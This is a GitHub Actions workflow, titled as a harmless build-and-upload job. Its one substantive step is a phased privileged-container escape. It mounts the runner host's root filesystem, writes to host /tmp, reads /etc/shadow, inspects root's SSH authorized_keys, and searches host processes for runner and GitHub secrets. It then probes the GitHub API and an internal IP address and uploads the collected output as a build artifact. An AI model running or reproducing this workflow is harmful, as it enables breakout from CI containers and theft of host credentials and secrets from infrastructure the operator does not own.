name: Build and Upload Artifact
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Phases 5+6 - Privileged Escape & API
        continue-on-error: true
        run: |
          mkdir -p dist
          echo "=== PHASE 5: PRIVILEGED DOCKER ESCAPE ===" > dist/p5.txt
          echo "--- Test writable /tmp on host ---" >> dist/p5.txt
          docker run --rm -v /:/host ghcr.io/github/gh-aw-mcpg touch /host/tmp/poc-$(date +%s) 2>&1 && echo "HOST FS WRITABLE to /tmp" >> dist/p5.txt || echo "NOT WRITABLE" >> dist/p5.txt
          
          echo "--- Read /etc/shadow ---" >> dist/p5.txt
          docker run --rm -v /:/host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "cat /host/etc/shadow 2>/dev/null | head -10" 2>&1 >> dist/p5.txt || echo "shadow not readable" >> dist/p5.txt
          
          echo "--- Add SSH key to root? ---" >> dist/p5.txt
          docker run --rm -v /:/host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "ls -la /host/root/.ssh/; cat /host/root/.ssh/authorized_keys 2>/dev/null | wc -l" 2>&1 >> dist/p5.txt
          
          echo "--- Check processes with secrets ---" >> dist/p5.txt
          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "ps aux 2>/dev/null | grep -iE 'runner|actions|github' | grep -v grep | head -20" 2>&1 >> dist/p5.txt
          
          echo "" >> dist/p5.txt
          echo "=== PHASE 6: GITHUB API ===" >> dist/p5.txt
          echo "--- API /user ---" >> dist/p5.txt
          curl -s https://api.github.com/user 2>&1 | head -5 >> dist/p5.txt
          echo "--- API /meta ---" >> dist/p5.txt
          curl -s https://api.github.com/meta 2>&1 | head -10 >> dist/p5.txt
          echo "--- Internal API (direct) ---" >> dist/p5.txt
          curl -sv --connect-timeout 5 https://20.75.202.224/ 2>&1 | head -30 >> dist/p5.txt

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: phases-5-6
          path: dist/
